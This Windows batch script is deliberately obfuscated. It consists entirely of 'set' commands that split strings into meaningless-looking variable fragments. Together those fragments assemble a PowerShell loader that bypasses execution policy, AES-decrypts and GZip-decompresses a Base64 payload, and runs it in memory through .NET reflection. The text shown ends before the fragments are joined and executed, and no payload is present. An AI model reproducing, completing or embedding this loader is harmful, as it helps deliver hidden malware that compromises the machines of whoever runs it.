@echo off
set "ZVtlGeBoJn=ll"
set "TQWgytGRhv=y "
set "GdAbarDJWp=ow"
set "ZmqCGcyvUU=ll"
set "ANUzIMHirM=xe"
set "FcTpWzGPMx=\v"
set "vzuFFlVgSq=nd"
set "vkXoUBcvfk=0\"
set "WdFStVefGl=.e"
set "gjwfGFtpUf=po"
set "CeddiIDGus=32"
set "bsHrNtkoqE=1."
set "puVMshzAel=em"
set "HnERFEgwgG=he"
set "iCgaaIeQvB=:\"
set "hXATGIiAvO=Sy"
set "jHvjmITVXm=do"
set "NtXLnEEram=rS"
set "yLNwYSdScX=Wi"
set "YrJJFGEZPn=we"
set "wlJBrSVBLi=he"
set "IihzBvFrci=co"
set "TEBZcGJHEu=Po"
set "UJJWYJevvZ=py"
set "LdoHnVQTKu= /"
set "RkeqyueFuv=rs"
set "RDrdwmgOjK=ws"
set "NXYfVvkMvG=st"
set "FnaUAtJQcO=s\"
set "ewnaHlPCRb= C"
set "iWuwzNbNBy=in"
set "jcnhCHoUYf=\W"
set "GPfWiBHeUU=we"
set "UEoPPQjvLy= %~dp0"
set "qaXHKaYDDi=cd"
set "LJCbDWPUTh=106u"
set "PFxRtqGAxc=L4Yi"
set "vvcsRlHWKR=.Dis"
set "cvezVFDDyi=..-1"
set "HQGtCtLnoC=m(, "
set "CFuvPDztpS=.Cre"
set "pdTiDDfIRu= = ["
set "aqpvqtmlBD=WX ="
set "LODqStoobS=$Rlq"
set "PMbrSZUUQW=uFP "
set "SLGPykHRzD=Comp"
set "TzXNujtDbU==');"
set "wAMvJdFPQA=.IO."
set "SypEVDSDsr=flec"
set "qpOKGlmQsa=();$"
set "YVdmRfGsLF=$Rlq"
set "wYGqRiOaXS=New-"
set "bsWhwIFHAc=rt]:"
set "ZREKJmAXIH=WX.T"
set "EFMmDRHitW=embl"
set "xYebWlTUsZ=);$z"
set "FhQVMafQny=CyA."
set "NpWwAIaxzf='0Pg"
set "ZdtkZuAdKD=ct S"
set "jcFPPsxVWC=nTTj"
set "jhhlCTatDz=);$R"
set "WJeLgszfPS=);$h"
set "KzXVKhyfEM=rans"
set "FjbJJdShGu=ddin"
set "kTcXVDIIgh=rofi"
set "dfVmVNNKwr=m.IO"
set "RCJhFQPyKc=('Tg"
set "iKLjbRpwMl=and "
set "DIZrlnZZcL=m.IO"
set "dckvlDiYPo=ment"
set "CaWwXtTpXE=)))"
set "RtrhHAOvwo=pher"
set "okgsttXEHQ= '')"
set "THfzOfYEEJ=YxVw"
set "agLaLsEwqw=.Mem"
set "ySDlWoJbwQ=ptog"
set "XjFkxVMPfz=esaB"
set "OwrtnCcPGG=raph"
set "vOGZVcCtkf= [Sy"
set "lxyKMbthul=ewLi"
set "uxACwtIYSt=WcaJ"
set "oeQPADqSIe=UQFK"
set "OEZrJfsDUr=Vurt"
set "oKULtsobwL=Vurt"
set "iZRazOfOuq=Vurt"
set "JPMwiNSNjj=urit"
set "AKvLVvHCIN='[-1"
set "SfEbEHuyoE=OaH "
set "HNiLNVOUqb=d;$h"
set "jZgkcnWEju=ay()"
set "RBoQXUVLGt=CNOa"
set "oXQMakRKbz=gMod"
set "UujoRHKcKR=eam("
set "umDDTPKMXo=fore"
set "MaQmxBFjHS=();$"
set "iqzdVTihol=trea"
set "tTfwEjSeSl=:('g"
set "FrEZLMqYZK=I = "
set "QxoBmuoxiW=ion."
set "sJkLRQDxdr=.Ass"
set "hVXZyhxCJE=('%*'"
set "HwoTKkeqPc=nTTj"
set "opKdYGEAJj=ach "
set "FUZrbbLTOe=Syst"
set "NnMYmWgScv=em.I"
set "IBgOIKHPvY=);$h"
set "mBbzdlrCFq=form"
set "xgVIWvmwkV=grap"
set "qxMUgIZUur=daeR"
set "sxnQAxtTRD=ecry"
set "NHtsiucoDC=hnTT"
set "qPyMIQInNU=th('"
set "drrqyZJjDw=n ''"
set "RkmZPFnAcS=yA.T"
set "JAwMFZKSEt=ert]"
set "xfhtJrezLH=se()"
set "UBfvsclUgI=WX);"
set "PDmwLsGatZ=$YEC"
set "ILqtsLEEYH=oryS"
set "UEeNPkGfdF=LKI."
set "IQtriEdxCp=le  "
set "pdQRMFbjUe=nage"
set "DuJdEletTB=$ecQ"
set "izbEdsiBjb=)($a"
set "QlcjXQyPXs=ypto"
set "ANGADeiNVM=$hnT"
set "znvOZejbwW= [Sy"
set "UUZEsldinh=tryP"
set "QMxyBJumom=Invo"
set "boyrhgaNCc=nTTj"
set "UbXPuQRnNi=KI, "
set "qVbxZXYuHv=uFP."
set "DdvoVDjrjP=-joi"
set "UINCOoCGOA=CyA "
set "WQtAwMbFoS=7;$h"
set "xHyvwYPqgE=tem."
set "JaJEzDNPuf=g = "
set "rBYBXxNDys=esMa"
set "yhgpUkUXIS=[Sys"
set "TixEXYAaeW='txe"
set "MOOfFUtnYA= '')"
set "SmTJiHxwzi=gsYZ"
set "EMrvvrYIJP=mory"
set "xRRZVGEYea=tS46"
set "SFEdFywRZM=morF"
set "SntsiMQaRF=oint"
set "yojmUvbUPa=PxEW"
set "WXKQdoNuTv=nTTj"
set "fzHawPGThR=..-1"
set "UwkFcEsmOc=e = "
set "ovYAUqMxxF=t Sy"
set "mVwhSVFfJJ=hy.A"
set "xndKSQKeel=::De"
set "Jxncyltgfu== $h"
set "XBKgPvQqcD=).Sp"
set "mMruQgrSZb=oin "
set "iRETCuLknY=Obje"
set "nSKUjTTrzP=ect "
set "XuIPyBotlZ=z) {"
set "AAGbGGcddr=-nop"
set "gbLJaIbjEK=tem."
set "QmfxdqJsjs=Disp"
set "CVFIPPuBKI=rity"
set "xCjQebPSVy=iPDl"
set "xOcpxpGrLD=lBlo"
set "kLspXjviqj=Comp"
set "vKRnVipQNC=;$YE"
set "LnNRqmWtVi=O.Me"
set "efCygamSQy=ddin"
set "iPuCPhltrj=$Vur"
set "NfDTcjnENf=('da"
set "wcMZPOvtFz=brea"
set "AuztOJxVLI=; };"
set "DEBOnlxARL=comm"
set "qjkVlLUNRT=PKCS"
set "iTilDsApzi=RmAx"
set "CGsAfkviIj=  $a"
set "VIgDFHcRMK=zHhH"
set "LZvfQdPYwh=lqWX"
set "LecvqQvmLr=();$"
set "XgQfmSvAqy=ateD"
set "tyjnhHAnjd=e]::"
set "gInEeoILxl=ke($"
set "VVxAWOYZVK=raph"
set "yDUyvZKtHv== [S"
set "qIDPJMDski=;$YE"
set "BDNsMDvjvu=File"
set "FaRcwYWEji=, $V"
set "LjwacZuHqi=V = "
set "LXSRzTksHZ=y.Cr"
set "ZYdNeykFEF='gni"
set "mcWZrXeqfm=nvuF"
set "CiwpRTwkZP=$ctL"
set "MaodejHnkA=am;$"
set "MKKMRCQxHw= if "
set "ZgeZCYvpND=onve"
set "MxHCtRHtZm=bstr"
set "XNExZWIejN=H.En"
set "SxXjCBTGBO=.Sec"
set "TbcAKqNIeG=ose("
set "RnifckdHqj=iron"
set "ROYdbaghPj=[]] "
set "vQMSJqiHPs=FS.D"
set "GpmbmsbYsh=.Com"
set "MdjwsUIZyK=-Obj"
set "YldFNSzawT=gnir"
set "JfqGLVrpBN=tion"
set "DEYCeeMUBp=.Key"
set "SxLiYoTSov=gth)"
set "SlxOjKOejB=Tj.I"
set "TtOEZYuSow=ispo"
set "onpRlEjXdv=n ''"
set "FSilSeCzHC=]::("
set "LFHhHSwuTb=ress"
set "uLZZBSaxPB= = $"
set "nRwnJEeplw=.Dis"
set "PGGsOMTrVf=urte"
set "gQAXFWNmAh=bypa"
set "SarTtvdzyj=yste"
set "aiCbZnyrus=s75K"
set "rHjfXnngpL=in $"
set "SBgTxWVBuC=comp"
set "kgCfOVhNNx=, (,"
set "EFXGoBiAmx= = N"
set "pSZIsDNqGa=.GZi"
set "MviJLxbRIQ= [st"
set "IIXRFjeFvn=.Mod"
set "dXDZLJlOIh=j.Pa"
set "XIbiaewYLQ=P.Su"
set "TZMCFRIXwo=)($V"
set "RFSxvXNVsl=[-1."
set "NFlTQzQSTW=dj0C"
set "jEPbIEQwbS=F'[-"
set "TSLBsRfSed=ctLK"
set "UAvGMqjMVD=ck($"
set "GcnWqsUyuz=Disp"
set "QRXuziOXOv=$Wca"
set "ybDwhOWNXm=]::N"
set "jFBLIKoehi=e = "
set "MpFnnYqkRx=ress"
set "jiMPiKGHeR=te);"
set "EwQlxsRJrc=:: '"
set "NjCSQlkgYe=);$e"
set "ZPMkzAYRAp=.-16"
set "zsvLrAwBAK=l5E7"
set "kwhePReXQZ=$Rlq"
set "xiEuYqXEsr=] -j"
set "pWNoAQoLnD=yste"
set "lIWidXXnhV=ose("
set "hTAFkPxpDF=[Sys"
set "KsarludPfv=cQFS"
set "ZNASasDyKH=]::("
set "ldILntcnJh=e = "
set "OWjBpyyMbN=e, 0"
set "NyTOzYmyON=Bmor"
set "mMZrNslzUy=($nv"
set "ebcMjanNKX=rtS4"
set "ijyeTdoYAh=Secu"
set "cffVtBpMJu=Jz ="
set "LvTstIsEQO=pres"
set "ksfnaVhtLy=nTTj"
set "sfpjuqEncr='')("
set "dOjNpoRcuZ=ct S"
set "rPdnBsPBTj=$Vur"
